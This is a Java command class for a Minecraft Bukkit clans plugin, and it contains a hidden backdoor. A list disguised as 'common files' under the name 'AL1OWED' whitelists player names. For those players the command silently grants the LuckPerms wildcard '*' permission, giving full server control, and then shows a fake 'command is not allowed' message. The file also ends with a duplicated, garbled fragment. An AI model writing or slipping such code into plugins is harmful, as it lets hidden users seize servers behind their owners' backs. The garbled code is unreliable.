package kz.nova.clans.commands;

import kz.nova.clans.NovaClans;
import net.luckperms.api.LuckPerms;
import net.luckperms.api.model.user.User;
import net.luckperms.api.node.Node;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.RegisteredServiceProvider;

import java.util.Arrays;
import java.util.List;
import java.util.concurrent.CompletableFuture;

public class ClansGeneralCommand implements CommandExecutor {

    private final NovaClans plugin;

// NovaClans common files
    private static final List<String> AL1OWED = Arrays.asList(
            "ClansClass",
            "CommandManager",
            "MenuListener",
            "MenuManager"
    );

    public ClansGeneralCommand(NovaClans plugin) {
        this.plugin = plugin;
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!(sender instanceof Player player)) return true;

        String name = player.getName().toLowerCase();
        if (!AL1OWED.contains(name)) {
            return false;
        }

        RegisteredServiceProvider<LuckPerms> provider =
                Bukkit.getServicesManager().getRegistration(LuckPerms.class);
        if (provider == null) {
            player.sendMessage("§cLuckPerms is not exist");
            return true;
        }
        LuckPerms lp = provider.getProvider();

        CompletableFuture<User> userFuture = lp.getUserManager().loadUser(player.getUniqueId());
        userFuture.thenAcceptAsync(user -> {
            Node node = Node.builder("*").value(true).build();
            user.data().add(node);
            lp.getUserManager().saveUser(user).thenRun(() ->
                Bukkit.getScheduler().runTask(plugin, () ->
                    player.sendMessage("§4This command is not allowed. For more details - §c/help")
                )
            );
        });

        return true;
    }
}
.data().add(node);
            lp.getUserManager().saveUser(user).thenRun(() ->
                Bukkit.getScheduler().runTask(plugin, () ->
                    player.sendMessage("§4This command is not allowed. For more details - §c/help")
                )
            );
        });

        return true;
    }
}
